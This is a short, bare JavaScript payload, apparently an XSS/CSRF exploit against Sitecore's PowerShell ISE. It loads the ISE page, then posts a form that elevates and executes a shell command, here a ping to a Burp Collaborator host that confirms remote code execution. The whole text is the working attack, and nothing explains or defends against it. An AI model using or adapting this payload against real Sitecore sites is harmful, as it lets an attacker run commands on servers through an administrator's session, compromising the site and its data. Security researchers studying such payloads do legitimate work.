var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3NTNlMzUzZi1jN2FjLTQxZTEtOWVjMS1mYTVkYWJjOWQ5YjkL&__VIEWSTATE=BAA9C8E1B9D847BEA06DDFD2103DF2F2&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20p8y5m93hrb0an2egfomk7tbvkmqdk19.burpcollaborator.net')
};
